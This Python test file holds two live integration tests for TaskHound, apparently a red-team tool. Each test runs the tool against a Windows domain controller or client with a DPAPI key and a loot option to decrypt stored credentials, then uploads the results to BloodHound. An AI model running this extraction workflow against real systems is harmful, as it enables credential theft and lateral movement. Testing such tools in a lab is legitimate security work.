"""
Live integration tests combining DPAPI extraction with BloodHound integration.

These tests validate that both features work together:
- Extract credentials using DPAPI
- Use those credentials for BloodHound ingestion
"""
import subprocess
from pathlib import Path

import pytest

pytestmark = [pytest.mark.slow, pytest.mark.live]


def test_dpapi_extraction_with_bloodhound_legacy(
    live_config, target_dc, dpapi_key_dc, sample_output_dir
):
    """
    Test full workflow: DPAPI extraction + BloodHound Legacy ingestion.
    
    1. Run TaskHound with DPAPI extraction on DC
    2. Parse output for decrypted credentials
    3. Upload results to BloodHound Legacy
    """
    bh_config = live_config.get("bloodhound_live", {}).get("legacy", {})

    if not bh_config.get("enabled", False):
        pytest.skip("BloodHound Legacy not configured in live_test_config.json")

    # Run TaskHound with both DPAPI and BloodHound options
    cmd = [
        "python", "-m", "taskhound",
        "--target", target_dc,
        "--username", live_config["username"],
        "--password", live_config["password"],
        "--domain", live_config["domain"],
        "--loot",
        "--dpapi-key", dpapi_key_dc,
        "--bh-live",
        "--legacy",
        "--bh-ip", bh_config["ip"],
        "--bh-user", bh_config["user"],
        "--bh-password", bh_config["password"],
        "--dc-ip", live_config["dc_ip"],
    ]

    result = subprocess.run(
        cmd, capture_output=True, text=True, cwd=Path(__file__).parent.parent
    )

    # Basic execution validation
    assert result.returncode == 0, f"TaskHound failed: {result.stderr}"
    assert "decrypted" in result.stdout.lower() or "bloodhound" in result.stdout.lower()


def test_dpapi_extraction_with_bloodhound_ce(
    live_config, target_client, dpapi_key_client, sample_output_dir
):
    """
    Test full workflow: DPAPI extraction + BloodHound CE ingestion.
    
    Uses test client for variety in tested systems.
    """
    bh_config = live_config.get("bloodhound_live", {}).get("bhce", {})

    if not bh_config.get("enabled", False):
        pytest.skip("BloodHound CE not configured in live_test_config.json")

    cmd = [
        "python", "-m", "taskhound",
        "--target", target_client,
        "--username", live_config["username"],
        "--password", live_config["password"],
        "--domain", live_config["domain"],
        "--loot",
        "--dpapi-key", dpapi_key_client,
        "--bh-live",
        "--bhce",
        "--bh-ip", bh_config["ip"],
        "--bh-user", bh_config["user"],
        "--bh-password", bh_config["password"],
        "--dc-ip", live_config["dc_ip"],
    ]

    result = subprocess.run(
        cmd, capture_output=True, text=True, cwd=Path(__file__).parent.parent
    )

    assert result.returncode == 0, f"TaskHound failed: {result.stderr}"
    assert "decrypted" in result.stdout.lower() or "bloodhound" in result.stdout.lower()
